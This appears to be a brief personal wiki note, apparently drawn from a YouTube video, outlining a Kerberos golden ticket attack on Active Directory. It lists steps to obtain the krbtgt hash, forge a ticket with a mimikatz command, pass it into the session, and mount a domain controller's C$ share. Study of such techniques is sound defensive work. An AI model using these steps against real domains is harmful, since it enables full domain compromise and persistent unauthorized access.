<!-- TITLE: Goldenticket -->
<!-- SUBTITLE: A quick summary of Goldenticket -->

# Golden ticket
From youtube video by VbScrub  https://www.youtube.com/watch?v=o98_eRt777Y

`1.  Get the krbtgt hash
2.  Run mimikatz
3.  Get Domain sid from user and dropping last -uid from it (example drop -500 from administrator sid)
4.  kerberose::golden /domain:domainname.dom.us /sid:domainsid /user:Administrator /krbtgt:krbhash /ptt
5.  the above ptt alters the current login session.  otherwise saves as file (seems like saving as file is good but I don't know how to load from file into session).
6.  klist from cmd prompt will show what tickets you have.
7.  net use does kerberos auth - note that the dc might need to be the full machine name net use O: \\dc.domainname.dom.us\C$ `
8. 